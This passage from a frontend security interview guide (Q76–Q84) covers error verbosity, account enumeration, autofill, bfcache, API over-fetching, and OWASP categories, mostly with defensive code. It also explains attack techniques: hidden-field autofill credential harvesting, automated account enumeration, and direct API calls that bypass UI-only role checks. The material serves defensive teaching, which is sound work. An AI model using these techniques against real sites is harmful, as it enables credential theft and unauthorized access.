Interviewers use this to see whether a candidate treats observability/analytics tooling with the same data-handling scrutiny as any other third-party integration, since it's an easy blind spot — "it's just for debugging" doesn't change what data actually left the browser and where it's now stored. The senior answer defaults to masking-first configuration, calls out that provider-hosted iframes for the most sensitive fields provide a structural (not just configuration-dependent) guarantee against this exact leak, and treats every new observability vendor as requiring the same review rigor as a data-processing agreement would demand — because it functionally is one.

Q76. How can verbose or overly descriptive error messages/API responses expose your internal architecture to attackers?

ROI: ★★★★ Frequency: Medium

Short Answer

Detailed error messages, stack traces, and API responses that reveal internal implementation details (database engine and version, internal service names, file paths, ORM query fragments, exact library versions) hand an attacker a head start on reconnaissance — they no longer need to guess your stack, they can read it off a 500 error page or a verbose validation response. This is a form of "security misconfiguration" (a distinct OWASP category, covered more fully in the OWASP-mapping section of this chapter) and the fix is consistent: generic, safe responses for anything user/attacker-facing, full detail preserved only in your own internal, access-controlled logs.

Detailed Answer

What information leaks in a typical unhardened setup

  • Stack traces revealing file paths, framework version, and internal function/module names.
  • Database error messages exposing the exact query, table/column names, or the database engine and version (useful for targeting known engine-specific vulnerabilities).
  • Validation error responses that confirm or deny specific internal facts — e.g. "email already registered" (enabling account enumeration) versus a generic "if this email is registered, we've sent a reset link" response that reveals nothing either way.
  • HTTP response headers naming exact server/framework versions (X-Powered-By: Express, verbose Server headers), giving version-specific vulnerability targeting a free head start.

The account-enumeration pattern specifically

A common, subtle instance: a "forgot password" or "sign up" flow that responds differently depending on whether an email/username already exists lets an attacker enumerate valid accounts at scale, purely from response differences — even without any stack trace or technical detail involved. This is worth calling out as its own pattern since it's easy to miss when thinking only about literal error-message verbosity.

Fixes

  • Centralize error handling (as covered in the earlier error-handling question) so raw backend/database errors never reach a user-facing response by construction, not by convention.
  • Use uniform, non-committal responses for anything that could otherwise reveal account existence, permission boundaries, or internal state through response differences alone.
  • Strip or genericize framework/server identification headers in production.
  • Log full detail server-side, in access-controlled logs, for actual debugging — the goal is removing detail from the untrusted-facing surface, not losing it entirely.

Code Example

// LEAKY: a raw error passed straight through to the client.
// { "error": "SequelizeUniqueConstraintError: Duplicate entry 'user@x.com'
//   for key 'users.email_UNIQUE' at /app/src/models/user.js:42" }

// SAFE: generic, non-committal response; full detail logged server-side only.
try {
  await createUser(data);
} catch (err) {
  logger.error("createUser failed", { err, context: data.email }); // full detail, internal only
  res.status(400).json({ error: "Unable to complete signup. Please try again." }); // no internals
}

// Account-enumeration-resistant password reset response -- identical
// regardless of whether the email actually exists in the system:
app.post("/forgot-password", async (req, res) => {
  await maybeSendResetEmail(req.body.email); // no-op internally if email doesn't exist
  res.json({ message: "If that email is registered, a reset link has been sent." });
  // NOT: "Email not found" vs "Reset link sent" -- that distinction leaks account existence.
});

// Strip identifying headers in production:
app.disable("x-powered-by");

Project Example

A security assessment found that a signup endpoint returned a distinctly different error message ("that email is already registered") versus a generic success message, letting the assessor enumerate thousands of valid customer email addresses in minutes via automated requests — a finding entirely independent of any traditional injection or XSS bug. Separately, an unrelated 500 error on a different endpoint exposed the exact ORM version and a database table name in its stack trace, information the same assessor used to look up known vulnerabilities for that specific ORM version. Both were fixed the same way: centralizing responses to be generic and non-committal for anything reaching an untrusted client, with full detail preserved only in internal logging.

Senior Engineer Perspective

The senior insight worth surfacing explicitly: information disclosure through "helpful" error messages or subtly different response shapes is often dismissed as low-severity because it isn't a direct exploit on its own — but it's frequently the reconnaissance step that makes a subsequent, more serious exploit possible (a version-specific vulnerability lookup, an enumerated list of real accounts to target). A senior candidate treats verbose errors and enumeration-enabling response differences as genuine findings worth fixing, not cosmetic nitpicks, and always frames the fix as "centralize and genericize," never as a per-endpoint patch.

Q77. How does browser autofill interact with security, and what are the risks of building custom form fields that fight it?

ROI: ★★★ Frequency: Low-Medium

Short Answer

Browser/password-manager autofill is generally a security improvement — it encourages long, unique, randomly-generated passwords per site rather than reused/weak ones a human would otherwise have to remember — but it introduces its own edge cases: autofill can populate hidden or unrelated fields if a form's structure/labeling confuses the heuristics (historically demonstrated as a way to harvest stored credentials via a form with cleverly hidden fields), and some teams' custom-styled form components deliberately fight autofill (disabling it, using non-standard input handling) in ways that push users back toward weaker, memorized, reused passwords — a net security regression despite looking like a UX improvement.

Detailed Answer

The historical hidden-field autofill risk

Security researchers have repeatedly demonstrated that a page with hidden or off-screen form fields matching common autofill heuristics (e.g. a hidden field styled with opacity:0 but still present in the DOM) can trick a browser's/extension's autofill into populating stored credentials into fields the user never saw or intended to submit, which malicious JavaScript then reads and exfiltrates — effectively a credential-harvesting technique that requires no user interaction beyond the page loading with autofill enabled. Browsers and password managers have hardened against known variants over time, but the underlying category (autofill triggered on non-visible/unintended fields) remains a reason to never place sensitive-shaped hidden fields on a page for unrelated tracking/analytics purposes.

Why fighting autofill on legitimate forms is often counterproductive

  • Disabling autofill (autocomplete="off" on a login/signup form) doesn't actually stop most modern browsers from offering it anyway in many cases, but it does actively discourage password managers from saving new credentials in some flows — pushing some users toward memorized, reused, weaker passwords instead.
  • Highly custom form components (a "styled" input built from non-standard elements, or one that intercepts/overrides paste and native input events) can break autofill's ability to recognize and populate the field at all, again nudging users toward manual entry of weaker credentials.
  • The security-conscious default is to use standard, semantic <input> elements with correct autocomplete attribute values (username, current-password, new-password, one-time-code) so browsers and password managers can do their job well, rather than treating autofill as an adversary to be defeated for aesthetic control.

What to actually avoid

  • Never place hidden/off-screen fields shaped like credential fields anywhere on a page for unrelated purposes (tracking, layout hacks) — this is exactly the shape the historical harvesting technique exploited.
  • Don't disable paste into password fields (an old, now-discouraged "security" pattern) — it actively discourages password-manager use and long random passwords, a net negative.
  • Use correct, specific autocomplete values rather than a blanket off, which mostly just degrades the user experience without a corresponding security benefit.

Code Example

// GOOD: standard inputs with correct, specific autocomplete hints -- lets
// browsers/password managers do their job well, encouraging strong,
// unique, manager-generated passwords.
<input type="email" name="email" autocomplete="username">
<input type="password" name="password" autocomplete="current-password">
<input type="password" name="newPassword" autocomplete="new-password">
<input type="text" name="otp" autocomplete="one-time-code" inputmode="numeric">

// AVOID: blanket-disabling autocomplete on auth forms -- discourages
// password-manager saving without a real corresponding security benefit.
<form autocomplete="off"> <!-- don't do this on login/signup forms -->

// AVOID: blocking paste into password fields -- discourages long,
// randomly-generated, manager-pasted passwords in favor of weaker typed ones.
// <input type="password" onPaste={(e) => e.preventDefault()}>  -- don't do this

// NEVER: hidden fields shaped like credential fields for unrelated purposes --
// historically exploitable for autofill-based credential harvesting.
// <input type="email" style="opacity:0;position:absolute" name="hiddenTrackingField">

Project Example

A redesigned login form used heavily customized, non-native-feeling input components for visual consistency with the design system, which broke the browser's ability to recognize and offer autofill for the username/password fields. User research afterward showed a measurable uptick in manually-typed, weaker, and sometimes reused passwords compared to the previous, more standard-markup form — a usability decision that had an unintended, measurable security regression. Restoring semantic <input> elements with correct autocomplete attributes underneath the custom visual styling (styling via CSS rather than replacing the underlying element type) recovered normal autofill behavior without sacrificing the visual design.

Senior Engineer Perspective

This question rewards a candidate who sees autofill as a security-relevant behavior worth actively supporting, not an aesthetic nuisance to override — the senior framing is that password-manager-generated credentials are one of the most effective, low-friction security improvements available to ordinary users, and any frontend decision that discourages their use (broken autofill, blocked paste, blanket autocomplete="off") has a real security cost even though it never shows up as a traditional "vulnerability." Naming the historical hidden-field credential-harvesting technique specifically shows awareness that this isn't purely a UX topic.

Q78. How can the browser's back-forward cache (bfcache) or navigation history expose sensitive rendered content after logout?

ROI: ★★★ Frequency: Low-Medium

Short Answer

The back-forward cache preserves a full, live snapshot of a previous page (including its rendered DOM state) so that navigating back/forward is instant, rather than a fresh reload. On a shared or public computer, if a user logs out and then someone hits the browser's back button, they can potentially see the exact rendered page as it looked before logout — including any sensitive data that was on screen — served straight from the bfcache snapshot rather than a fresh, now-unauthenticated page load. This is distinct from a purely server-side session-expiry concern, since the vulnerable content is already sitting in the browser's memory, independent of whether the server would still authorize a fresh request for it.

Detailed Answer

Why this differs from normal cache/session concerns

Standard advice ("don't cache authenticated API responses," covered elsewhere in this chapter) addresses the network/HTTP caching layer. Bfcache operates at a different layer entirely — it's a snapshot of the fully-rendered page (DOM, JS execution state, scroll position) taken by the browser for fast back/forward navigation, independent of any Cache-Control headers on the original response in many cases. A page can be correctly marked non-cacheable at the HTTP level and still be restorable from bfcache when the user presses back.

Where this bites in practice

A user views a sensitive page (account details, a document, a message), logs out via a clear "Log out" action, and the app correctly redirects to a login screen. If the user (or the next person using a shared device) presses the browser's back button, some browsers can restore the bfcache snapshot of the sensitive page exactly as it was rendered pre-logout, momentarily or persistently displaying it before any client-side "am I still authenticated" check has a chance to run — because the page is being restored, not freshly loaded and executed from scratch.

Mitigations

  • Listen for the pageshow event and check its event.persisted flag — when true, the page was restored from bfcache rather than freshly loaded, and the app should re-verify auth state immediately and redirect/blank the view if the session is no longer valid.
  • For the most sensitive pages, consider explicitly opting out of bfcache eligibility where your framework/server supports doing so (historically via certain response headers), understanding this trades away the performance benefit for that specific page.
  • Ensure logout clears enough client-side state (not just a token, but any component state holding sensitive rendered data) that even if a bfcache restoration occurs, a subsequent auth re-check promptly clears the display.

Code Example

// Detect a bfcache restoration and re-verify auth state immediately,
// rather than trusting the already-rendered (possibly stale/sensitive) DOM.
window.addEventListener("pageshow", (event) => {
  if (event.persisted) {
    // This page was restored from the back-forward cache, not freshly loaded.
    verifyStillAuthenticated().then((ok) => {
      if (!ok) {
        document.body.innerHTML = "";       // clear whatever sensitive content was showing
        window.location.replace("/login");  // force a genuinely fresh, unauthenticated load
      }
    });
  }
});

async function verifyStillAuthenticated() {
  try {
    const res = await fetch("/api/session", { credentials: "include" });
    return res.ok;
  } catch {
    return false;
  }
}

Project Example

A shared-kiosk healthcare portal had staff log out between patients, but a usability tester on a shared device pressed the browser's back button after a staff member's logout and briefly saw the previous patient's record rendered exactly as it had appeared before logout, served from the bfcache rather than a fresh (now correctly redirected) page load. Adding a pageshow listener that immediately re-verified session validity on any bfcache restoration, clearing the DOM and forcing a redirect when the session was invalid, closed the gap without disabling bfcache's performance benefit for the rest of the app's less sensitive pages.

Senior Engineer Perspective

This is a genuinely under-known corner of frontend security that even experienced engineers often haven't encountered directly — the senior signal is recognizing that "the page looked correct after logout" isn't the same guarantee as "every possible way to reach this rendered state re-checks auth," and that browser-level performance optimizations like bfcache can silently reintroduce stale, sensitive rendered content that purely server-side session invalidation doesn't reach. Naming the specific pageshow/event.persisted mechanism as the concrete fix, rather than a vague "be careful with caching," is what distinguishes real familiarity here.

Q79. How can verbose GraphQL/REST API responses expose your internal data model even when the UI doesn't display all of it?

ROI: ★★★★ Frequency: High

Short Answer

A very common pattern: the backend returns the entire object (every field in the database record) and the frontend simply renders the two or three fields it needs, discarding the rest client-side — but "discarded by the UI" is not "never sent." Anyone with DevTools' network tab (any user, not just a sophisticated attacker) can see the full raw response and every field it contains, including internal fields never meant to be exposed: other users' data embedded in a list response, internal flags/scores, cost/margin data, or fields that reveal your data model's shape in ways that aid a later, more targeted attack.

Detailed Answer

Why "the UI doesn't show it" is not a security boundary

This is the same underlying mistake as "security through obscurity" in a different guise: filtering data for display happens in the frontend, entirely under the viewer's control (they can inspect network responses, disable JS, or call the API directly), so any field present in the raw response is effectively public to that user regardless of what the rendered UI chooses to show. The authorization/field-filtering decision must happen server-side, based on who is actually asking, not client-side based on what a particular screen happens to render.

Common concrete leaks from this pattern

  • A "list users" endpoint returning full user objects (including email, internal role flags, or even password-hash-adjacent fields) when the UI only displays a name and avatar.
  • An e-commerce product API returning internal cost/margin data alongside the customer-facing price, visible to anyone who inspects the response even though no UI element renders it.
  • A GraphQL query that, because the schema exposes a field, can be asked for directly regardless of what the officially shipped UI queries for — recall the earlier GraphQL introspection discussion; even without introspection, a known/guessed field name can often still be queried if the resolver doesn't independently authorize it.
  • Nested/related-object over-fetching — returning a full related record (e.g. embedding the complete "owner" user object inside a "document" response) when only the owner's display name was ever needed.

Fixes

  • Design API responses around what the authenticated caller is authorized to see, not around convenience of "just return the whole record" — an explicit response/DTO shape per endpoint, or field-level authorization in GraphQL resolvers, rather than relying on the frontend to be the only thing standing between a full record and the network.
  • Treat this as a backend responsibility primarily, but a frontend/full-stack engineer reviewing an API contract should flag "why is this field in the response at all if no UI ever needs it" as a legitimate review comment, not just a bandwidth optimization suggestion.
  • Periodically audit real production API responses (not just the documented contract) for fields nobody remembers adding a reason for.

Code Example

// The UI only renders name + avatar...
function UserCard({ user }) {
  return <div><img src={user.avatarUrl} /><span>{user.name}</span></div>;
}

// ...but if the API response looks like this, EVERYTHING here is visible
// to anyone inspecting the network tab, regardless of what the UI renders:
// GET /api/users
// [{
//   "id": 42, "name": "Jane Doe", "avatarUrl": "...",
//   "email": "jane@example.com",           // never shown, but sent
//   "internalRiskScore": 0.83,               // internal-only field, leaked
//   "isBetaTester": true,                    // unreleased-feature signal, leaked
//   "lastLoginIp": "203.0.113.7"             // sensitive, unnecessary, leaked
// }]

// FIX: shape the response server-side around what's actually needed/authorized,
// not around "just return the model":
// GET /api/users -> [{ "id": 42, "name": "Jane Doe", "avatarUrl": "..." }]

// GraphQL equivalent: don't rely on "the client only asks for name/avatarUrl" --
// a field being present in the schema means anyone can query it directly,
// so field-level authorization belongs in the resolver, not the client's query shape.

Project Example

A marketplace app's "browse sellers" screen rendered only a seller's name and rating, but a routine security review of raw network traffic found the underlying API response included each seller's full internal fraud-risk score and unmasked bank-payout details — fields the frontend simply never rendered, but that were fully visible to any logged-in user inspecting the response, and had been for over a year. The fix moved response shaping server-side into an explicit per-endpoint DTO, sent only the fields the "browse sellers" use case actually needed, and prompted an audit of every other list-style endpoint for the same over-fetching pattern.

Senior Engineer Perspective

This is one of the highest-frequency real-world findings in frontend-adjacent security reviews precisely because it's invisible from the UI alone — you have to actually look at the network tab, not the rendered page, to find it. The senior habit worth naming explicitly: when reviewing any new API integration, check the raw response against what the UI renders and ask why any gap exists, rather than reviewing only the components that consume a subset of the data and assuming the rest is harmless because "nothing displays it."

Q80. What frontend-side memory/DevTools exposure risks exist for decrypted or sensitive in-memory data, and how much should you actually worry about them?

ROI: ★★★ Frequency: Low

Short Answer

Anything held in JavaScript memory — a decrypted document, a token, a form's in-progress values — is inspectable by anyone with DevTools access to that browser session (via the debugger, memory snapshots, or simply setting a breakpoint and inspecting variables), and this is fundamentally unavoidable for any client-side JavaScript application, not a bug to "fix." The realistic threat model this matters for is a user's own device being physically accessed by someone else (shared computer, stolen/unlocked device, a malicious co-worker), not a remote attacker — for remote threats, XSS is the far more relevant vector (already covered extensively), since a remote attacker with no code-execution foothold can't casually open your victim's DevTools.

Detailed Answer

Why this is a fundamentally different threat model than most of this chapter

Almost everything else in this chapter assumes a remote attacker trying to reach into your app from the network or via injected code. DevTools/memory inspection requires the attacker to already have some form of access to the user's actual browser session in that moment — physical device access, a shared/public computer, or (functionally overlapping with the browser-extension question earlier) a malicious extension that can achieve similar visibility. It's worth being explicit with an interviewer about which threat model you're addressing, since the mitigations differ.

Where this realistically matters

  • Shared/kiosk devices where a user might walk away without locking the screen, leaving an authenticated session (and whatever's currently in memory) inspectable by the next person.
  • A genuinely sensitive client-side-decrypted-content scenario (e.g. an end-to-end-encrypted messaging app decrypting message content in the browser) — here, the decrypted plaintext necessarily exists in memory at some point for rendering, and no amount of clever JS can fully hide that from someone with direct access to the running browser process.
  • Corporate/managed-device contexts where an employer or IT department has legitimate device-level access — relevant to think about for what data an app should even decrypt/render on a managed device versus keep server-side.

What's realistic to do, and what isn't

  • Realistic: minimize how long sensitive data lives in memory (clear variables/state promptly after use rather than holding them indefinitely), auto-lock/re-authenticate sessions after inactivity especially on shared-device-likely contexts, and avoid unnecessarily duplicating sensitive data across multiple in-memory locations.
  • Not realistic: trying to "hide" data from DevTools via obfuscation, anti-debugging tricks, or code minification — these can be trivially bypassed by anyone with real access and shouldn't be presented as a security control; at best they're a very mild speed bump against a casual, non-targeted observer.
  • For the end-to-end-encryption case specifically, the honest answer is that the browser is fundamentally a less controlled environment than a purpose-built native client for this specific threat, and that's an accepted trade-off of choosing a web delivery model for such an app, not something frontend code can fully solve away.

Code Example

// Realistic mitigation: minimize sensitive data's lifetime in memory,
// clear it promptly rather than holding it in a long-lived variable/state.
function useDecryptedDocument(docId) {
  const [content, setContent] = useState(null);
  useEffect(() => {
    let plaintext;
    decryptDocument(docId).then((p) => { plaintext = p; setContent(p); });
    return () => {
      setContent(null);   // clear from React state on unmount
      plaintext = null;    // drop the local reference promptly, don't linger
    };
  }, [docId]);
  return content;
}

// Auto-lock on inactivity for shared/kiosk-likely contexts -- a genuinely
// effective mitigation for the "walked away from the device" scenario:
let lastActivity = Date.now();
["click", "keydown", "mousemove"].forEach((evt) =>
  window.addEventListener(evt, () => (lastActivity = Date.now()))
);
setInterval(() => {
  if (Date.now() - lastActivity > INACTIVITY_TIMEOUT_MS) lockSessionAndClearSensitiveState();
}, 30000);

// NOT a real mitigation -- obfuscation/anti-debugging tricks are trivially
// bypassed by anyone with actual DevTools access and shouldn't be relied on:
// (function(){ if (window.devtools) { /* ... */ } })();  -- false sense of security

Project Example

A clinical-notes application briefly considered adding anti-debugging/obfuscation tricks to "prevent DevTools inspection" of decrypted patient notes after a security question raised the concern, but the team correctly reframed the actual, addressable risk as device-level: unattended, unlocked shared workstations in clinical settings. They implemented a short inactivity auto-lock that cleared decrypted content from memory and required re-authentication, which addressed the realistic threat (someone walking up to an unattended, still-logged-in session) far more effectively than any DevTools-obfuscation approach would have against a determined, device-present observer.

Senior Engineer Perspective

The senior signal here is precision about threat models: correctly identifying that "someone can inspect JS memory with DevTools" is a device-access threat, not a remote-attacker threat, and therefore doesn't call for the same kind of mitigation as XSS or CSRF. A candidate who proposes obfuscation or anti-debugging code as a serious security control is missing this distinction; a candidate who says "that's inherent to running in a browser — the actual mitigation is auto-lock and minimizing memory lifetime, matched to the realistic device-access threat" is demonstrating the more mature, calibrated understanding interviewers are listening for.

Q81. How does OWASP's "Broken Access Control" category apply to frontend engineering, given that authorization is fundamentally a backend concern?

ROI: ★★★★★ Frequency: High

Short Answer

The actual enforcement of authorization must live server-side — full stop — but frontend engineering has a real, recurring responsibility to not create the false impression that client-side checks are a security boundary. The most common frontend-side instance of broken access control is hiding a UI element (an "Admin" button, a restricted route) based on a client-side role check while the underlying API endpoint performs no independent server-side authorization — anyone can call that endpoint directly, bypassing the UI entirely. Frontend role/permission checks are a UX convenience (don't show buttons a user can't use) and must never be the only gate.

Detailed Answer

The specific frontend-relevant failure pattern

A React app with client-side route guards (<ProtectedRoute role="admin">) or conditionally-rendered UI based on a JWT's claimed role gives a clean, secure-feeling UX — but if the corresponding API endpoints trust the same claims without re-verifying server-side (or worse, don't check authorization at all, assuming "the UI already handles it"), the actual access control doesn't exist. Anyone with basic tooling (curl, Postman, browser DevTools to call fetch directly) bypasses the entire frontend layer trivially.

What frontend engineers should actually do

  • Build client-side role/permission checks freely for UX (hiding irrelevant actions, showing appropriate empty/error states) — this is legitimate and valuable, just never sufficient on its own.
  • In code review, flag any new protected feature/endpoint and explicitly ask "does the backend independently enforce this, or are we relying on the frontend not showing the button?" — a frontend engineer is often well-positioned to catch this gap precisely because they can see both the UI logic and the API contract.
  • Never derive authorization decisions from client-controllable state (a JWT claim your own frontend set, a URL parameter, a value in localStorage) without the server independently re-verifying against its own source of truth.
  • Design "insufficient privilege" as an expected, gracefully-handled API response (a 403) that the frontend displays cleanly — a signal that the real check happened server-side, not that the frontend prevented the request from ever being attempted.

Object-level authorization — a frequent related gap

Beyond role-based checks, a very common broken-access-control instance is an endpoint that checks "is this user logged in" but not "does this specific record belong to this specific user" — e.g. GET /api/invoices/1234 returning any invoice by ID regardless of who's asking (insecure direct object reference). This is purely a backend fix, but frontend engineers building ID-driven URLs/routes should recognize this pattern and flag it when reviewing an API they're integrating against.

Code Example

// Frontend-only "protection" -- a false sense of security if the API
// doesn't independently enforce the same rule:
function AdminPanel() {
  const { role } = useAuth();
  if (role !== "admin") return <p>Not authorized</p>; // UX only, NOT a security boundary
  return <AdminDashboard />;
}
// Anyone can still call:
// fetch("/api/admin/users", { headers: { Authorization: `Bearer ${anyValidToken}` } })
// -- if the SERVER doesn't independently check the role, this succeeds regardless
//    of what the UI shows.

// The REQUIRED server-side check (this is the actual security boundary):
app.get("/api/admin/users", requireAuth, (req, res) => {
  if (req.user.role !== "admin") return res.status(403).json({ error: "forbidden" });
  res.json(await getAllUsers());
});

// Object-level check -- not just "logged in," but "owns this specific record":
app.get("/api/invoices/:id", requireAuth, async (req, res) => {
  const invoice = await db.getInvoice(req.params.id);
  if (invoice.ownerId !== req.user.id) return res.status(403).json({ error: "forbidden" });
  res.json(invoice);
});

Project Example

A SaaS admin panel hid its "delete organization" button from non-admin users purely via a frontend role check, while the corresponding DELETE endpoint trusted the same JWT claim without an independent server-side role verification, on the (incorrect) assumption that "no UI exposes this to non-admins, so it's fine." A penetration test demonstrated that any authenticated user, calling the endpoint directly, could delete any organization regardless of their actual role — a full broken-access-control finding. Adding the missing server-side role check (identical logic to what the frontend already displayed, just correctly enforced where it mattered) closed the gap; the frontend code required no change at all, since its role check had been legitimate UX, just insufficient alone.

Senior Engineer Perspective

Interviewers use this question to see whether a frontend-focused candidate correctly understands the boundary of their own responsibility without either overclaiming ("our frontend handles authorization") or underclaiming ("authorization isn't a frontend concern at all, not my problem"). The senior position: frontend engineers don't implement the security boundary, but they are frequently the first to notice when one is missing, because they're the ones building the UI that assumes it exists — flagging that gap in review is a genuine, valuable frontend security contribution.

Q82. How does OWASP's "Cryptographic Failures" category show up in frontend code, given that most real cryptography should happen server-side?

ROI: ★★★★ Frequency: Medium

Short Answer

The frontend-relevant instances are less "we implemented broken crypto" and more "we made a decision that undermines cryptographic guarantees elsewhere in the system": serving any part of the app over plain HTTP (undermining TLS entirely), storing something that should be encrypted-at-rest in plain localStorage, hand-rolling client-side "encryption" for something that needs real security (almost always a mistake — client-side JS crypto can't keep a key secret from the user of that same browser), or trusting a client-side hash/check as if it were a security-relevant guarantee rather than an integrity/UX convenience.

Detailed Answer

Why "crypto in the browser" is a fundamentally constrained proposition

Any encryption scheme needs a secret the attacker doesn't have. In a browser, the "attacker" and the "legitimate user" are often the exact same person's browser session — if your JS needs the decryption key to display something to the legitimate user, that key is present in the same execution context an attacker (via XSS) or the user themselves could inspect. This is why "client-side encryption" for protecting data from the app's own operator (true end-to-end encryption) is a legitimate, hard, specialized problem — but "client-side encryption" as a substitute for TLS or server-side protection is usually a red flag suggesting a misunderstanding of what problem is actually being solved.

Concrete frontend-relevant failure patterns

  • Serving any page or subresource over plain HTTP (mixed content, covered earlier) — the most impactful and common cryptographic-failure-adjacent frontend issue.
  • Implementing a custom "obfuscation" scheme (base64-encoding a value and calling it "encrypted") — provides no real cryptographic guarantee and often signals a misunderstanding worth correcting in review.
  • Storing session/auth tokens in a way that assumes storage-layer confidentiality that doesn't actually exist (recall the localStorage-vs-cookie discussion) — not itself a crypto bug, but frequently discussed alongside this OWASP category since it's about protecting sensitive values.
  • Using outdated/weak client-side hashing for anything security-relevant (e.g. hashing a password client-side with a fast, unsalted hash "for extra security" before sending it — this doesn't add real security and can create a false sense of protection while the actual server-side password hashing, which is what matters, might be assumed unnecessary).
  • Relying on `Math.random()` (not cryptographically secure) for anything security-relevant (a token, a nonce) instead of the Web Crypto API's `crypto.getRandomValues`.

The correct frontend posture

Treat almost all real cryptographic work as a backend/infrastructure responsibility (TLS termination, password hashing, encryption-at-rest) and limit frontend crypto usage to well-understood, narrow cases using the Web Crypto API correctly — PKCE's SHA-256 challenge generation (covered earlier) is a good example of legitimate, narrow, correctly-scoped client-side crypto usage.

Code Example

// WRONG: "obfuscation" mistaken for encryption -- provides no real security.
const fakeEncrypted = btoa(sensitiveValue); // base64 is NOT encryption, trivially reversible

// WRONG: insecure randomness for a security-relevant value.
const token = Math.random().toString(36).slice(2); // predictable, NOT cryptographically secure

// RIGHT: use the Web Crypto API for anything security-relevant generated client-side.
function generateSecureToken() {
  const bytes = new Uint8Array(32);
  crypto.getRandomValues(bytes); // cryptographically secure randomness
  return Array.from(bytes, (b) => b.toString(16).padStart(2, "0")).join("");
}

// RIGHT scope for client-side crypto: PKCE challenge generation (real
// cryptographic primitive, used for its actual intended purpose):
const digest = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(codeVerifier));

// WRONG mental model: hashing a password client-side as a substitute for
// (rather than in addition to, and never instead of) proper server-side
// hashing -- the server MUST still hash+salt with a proper algorithm
// (bcrypt/argon2/scrypt) regardless of anything the client does.

Project Example

A team building a "secure notes" feature implemented client-side AES encryption using a key derived from the user's password and stored the encrypted blob server-side, believing this made the feature "end-to-end encrypted." A security review found the decryption key was reconstructed and held in ordinary JS memory every time the notes were viewed, with no protection beyond what any other in-memory value in the app had — meaning a single XSS anywhere in the app could capture the key and decrypt everything, providing essentially none of the isolation a genuine end-to-end-encrypted system is supposed to guarantee. The team either needed to invest properly in the hard problem of real E2E encryption (key management, XSS-hardening commensurate with the stakes) or drop the "end-to-end encrypted" claim and rely on standard server-side encryption-at-rest, which was more honest about the actual guarantee being provided.

Senior Engineer Perspective

The senior framing: most "cryptographic failure" findings in a frontend context aren't about broken algorithms, they're about a mismatch between what a team believes a client-side crypto scheme guarantees and what it actually can guarantee given that the code runs in the exact environment the threat (XSS, device access) also lives in. A strong candidate is skeptical by default of any "client-side encryption" claim and asks specifically what secret is being protected from whom, and whether that secret can realistically stay hidden from an attacker who has the same level of access to the browser as the legitimate user does.

Q83. How does "Insecure Design" as an OWASP category apply specifically to frontend architecture decisions made early in a project?

ROI: ★★★★ Frequency: Medium

Short Answer

Insecure Design is about flaws baked into the architecture and threat model before any code-level bug even exists — no amount of careful implementation later fixes a fundamentally unsound design decision. Frontend-relevant examples: choosing to store long-lived credentials in a location with no plan for the resulting XSS blast radius, designing a "password reset" flow without considering enumeration/rate-limiting from the start, or building a multi-tenant SPA without deciding early how tenant isolation will actually be enforced (assuming "the API will handle it" without that being an explicit, reviewed design decision). This category rewards threat-modeling a feature before building it, not just reviewing the code afterward.

Detailed Answer

Why this is distinct from an implementation bug

A SQL injection is a coding mistake within a sound design (the design intended to prevent it; the implementation failed to). Insecure Design is when the design itself never accounted for the threat — e.g. a feature was built with no consideration of what happens if a malicious actor is the one using it, only ever considering the happy path of a well-behaved user. Fixing an implementation bug is a patch; fixing insecure design often means rethinking the feature.

Frontend-relevant examples worth recognizing early

  • Auth architecture chosen without a threat model: picking localStorage-based tokens because "it's simple" without ever deciding what the XSS mitigation strategy will be — this chapter's token-storage discussion is exactly this category of decision, and it belongs at design time, not as a later retrofit.
  • A "share this link" feature with no expiry/scoping model decided upfront: building shareable links first and only later asking "should these expire? can they be revoked? are they guessable?" — these should be design-time questions.
  • Multi-tenant frontend state management with no explicit tenant-isolation decision: caching/storing data client-side across tenant switches without an early decision about how isolation is guaranteed, risking cross-tenant data bleed in caches/state (echoing the shared-device cache-leakage pattern covered earlier, but at a design level rather than an implementation oversight).
  • A rate-limiting/abuse-prevention strategy treated as an afterthought rather than a designed-in part of any user-facing action with real-world cost (sending SMS/emails, triggering expensive backend work) from day one.

How to actually apply this as a frontend engineer

Before building a new feature, ask explicitly: "what does a malicious user of this exact feature do with it, and does our design account for that?" — not as a separate security review bolted on afterward, but as part of normal design/planning discussion, the same way you'd think through error states or edge cases for correctness.

Code Example

// INSECURE DESIGN example: a "share this document" feature designed with
// no expiry/revocation model from the start -- the implementation itself
// might be bug-free, but the design never accounted for a leaked link.
function ShareLink({ docId }) {
  const link = `https://app.example.com/shared/${docId}`; // permanent, unscoped, forever valid
  return <input readOnly value={link} />;
}

// DESIGNED with the threat considered from the start: scoped, expiring,
// revocable -- a design decision, not a later patch.
async function createShareLink(docId) {
  const { token, expiresAt } = await api.createShareToken(docId, { ttl: "7d" });
  return `https://app.example.com/shared/${docId}?token=${token}`;
  // token is single-purpose, time-limited, and independently revocable
  // server-side -- decided as part of the feature's design, not bolted on
  // after a leaked-link incident.
}

// A revoke action is a first-class part of the SAME feature's design,
// not a "we'll add that later if someone asks":
async function revokeShareLink(docId, token) {
  await api.revokeShareToken(docId, token);
}

Project Example

A document-sharing feature shipped with permanent, unscoped share links (no expiry, no revocation) because the initial design discussion focused entirely on the happy-path UX ("how easy is it to share a link") and never explicitly considered what should happen if a link leaked or a collaborator's access needed to end. Retrofitting expiry and revocation after the fact required a breaking API change and a data migration for every previously-issued link, considerably more expensive than if the threat had been part of the original design conversation. The postmortem's main recommendation wasn't a code fix — it was adding "what if this feature is misused or a credential from it leaks" as a standard question in the team's feature design template going forward.

Senior Engineer Perspective

This category is exactly why "security review" shouldn't be purely a late-stage code-review gate — the senior instinct is to bring threat-modeling questions into the design/planning conversation itself, where a fundamentally different, cheaper design choice is still possible, rather than discovering a design-level flaw only after it's built and now requires a costly retrofit. A candidate who can describe threat-modeling a feature before writing code, using a concrete recent example, is demonstrating exactly the habit this OWASP category is meant to encourage.

Q84. How does OWASP's "Security Misconfiguration" category apply to a typical frontend deployment pipeline?

ROI: ★★★★ Frequency: High

Short Answer

This category is about security controls that exist but aren't correctly enabled, applied consistently, or kept up to date — and for a frontend team it maps directly onto several things already covered in this chapter individually: missing/incomplete security headers on some routes, a permissive CORS policy left over from debugging, source maps or debug endpoints accidentally shipped to production, default configurations never hardened (a framework's default error page still enabled, verbose logging left on), and inconsistent configuration across environments (staging correctly locked down, production accidentally still permissive) that goes unnoticed because nobody compares them side by side.

Detailed Answer

Why this is often the highest-volume finding in real audits

Unlike a subtle logic bug, misconfiguration findings are usually simple to describe and simple to fix individually — which is exactly why they accumulate: each one alone seems minor ("we'll add that header later"), but a security review frequently finds a long list of small, independently-fixable gaps that collectively represent significant exposure, none of which required a sophisticated attacker to find.

